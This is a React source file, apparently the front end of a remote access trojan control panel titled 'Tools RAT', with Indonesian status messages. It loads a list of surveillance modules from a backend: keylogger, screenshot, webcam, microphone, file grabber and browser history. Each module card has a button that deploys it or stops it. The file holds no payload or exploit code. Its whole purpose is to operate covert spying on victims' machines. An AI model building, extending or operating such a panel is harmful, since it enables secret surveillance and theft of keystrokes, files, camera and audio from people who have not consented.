import { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { FaPowerOff, FaPlay, FaStop, FaKey, FaCamera, FaMicrophone, FaFile, FaHistory } from 'react-icons/fa';
import Navbar from '../components/Navbar';
import Sidebar from '../components/Sidebar';
import api from '../api/axios';
import toast from 'react-hot-toast';

const Tools = () => {
  const [tools, setTools] = useState([]);
  const [loading, setLoading] = useState(true);

  const toolIcons = {
    keylogger: <FaKey />,
    screenshot: <FaCamera />,
    webcam: <FaCamera />,
    microphone: <FaMicrophone />,
    filegrabber: <FaFile />,
    browserhistory: <FaHistory />,
  };

  useEffect(() => {
    fetchTools();
  }, []);

  const fetchTools = async () => {
    try {
      const res = await api.get('/tools');
      setTools(res.data);
    } catch (err) {
      toast.error('Gagal ambil data tools');
    } finally {
      setLoading(false);
    }
  };

  const toggleTool = async (toolName, currentStatus) => {
    try {
      const newStatus = !currentStatus;
      await api.post(`/tools/${toolName}/toggle`, { active: newStatus });
      toast.success(`${toolName} ${newStatus ? 'diaktifkan' : 'dinonaktifkan'}`);
      fetchTools();
    } catch (err) {
      toast.error('Gagal toggle tool');
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-primary flex items-center justify-center">
        <div className="text-accent text-xl animate-pulse">Loading...</div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-primary flex">
      <Sidebar />
      <div className="flex-1">
        <Navbar />
        <main className="p-6">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
          >
            <h2 className="text-2xl font-bold mb-6 glow-text">Tools RAT</h2>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
              {tools.map((tool, index) => (
                <motion.div
                  key={index}
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                  transition={{ delay: index * 0.1 }}
                  className="glass-effect rounded-xl p-6 glow-border"
                >
                  <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center gap-3">
                      <div className={`text-2xl ${tool.active ? 'text-cyber' : 'text-gray-500'}`}>
                        {toolIcons[tool.name] || <FaPowerOff />}
                      </div>
                      <div>
                        <h3 className="font-semibold capitalize">{tool.name}</h3>
                        <p className="text-xs text-gray-500">{tool.description}</p>
                      </div>
                    </div>
                    <span className={`text-xs px-2 py-1 rounded ${tool.active ? 'bg-cyber/20 text-cyber' : 'bg-gray-700 text-gray-400'}`}>
                      {tool.active ? 'Active' : 'Inactive'}
                    </span>
                  </div>

                  <button
                    onClick={() => toggleTool(tool.name, tool.active)}
                    className={`w-full py-2 rounded-lg transition flex items-center justify-center gap-2 ${
                      tool.active
                        ? 'bg-red-500/20 text-red-400 hover:bg-red-500/30'
                        : 'bg-cyber/20 text-cyber hover:bg-cyber/30'
                    }`}
                  >
                    {tool.active ? <FaStop /> : <FaPlay />}
                    {tool.active ? 'Stop' : 'Deploy'}
                  </button>
                </motion.div>
              ))}
            </div>
          </motion.div>
        </main>
      </div>
    </div>
  );
};

export default Tools;
